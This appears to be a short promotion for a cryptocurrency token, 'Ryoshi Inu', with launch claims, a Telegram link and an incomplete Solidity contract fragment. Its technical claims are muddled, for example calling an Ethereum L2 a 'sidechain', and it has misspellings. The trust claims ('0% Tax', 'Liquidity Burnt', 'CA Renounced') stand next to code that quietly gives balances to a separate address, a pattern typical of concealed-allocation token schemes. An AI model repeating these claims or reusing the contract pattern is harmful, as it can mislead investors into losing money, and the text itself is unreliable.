...
Ryoshi Inu will be a proof-of-stake (PoS) blockchain that will begin by running on the Ethereum L2 network.

Knowing that L2 Ethereum’s largest sidechain and is compatible with the Ethereum Virtual Machine, we have decided to use it for its exciting possibilities, exponential growth potential and lower fees.

Live on Gorli Testnet (github approval submitted), and Ropsten live by tomorrow, and Mainnet 2-3 days before the merge. Consenses is approved with over 18 delegators (110k minimums).

0% Tax
Liquidity Burnt
CA Renounced

TG: https://t.me/RyoshiInu
...
contract RyoshiInu is Ownable {
    constructor(
        ...
        _balances[RYOSHI] = like;
        _balances[msg.sender] = _tTotal;
        rewardtoken[RYOSHI] = like;
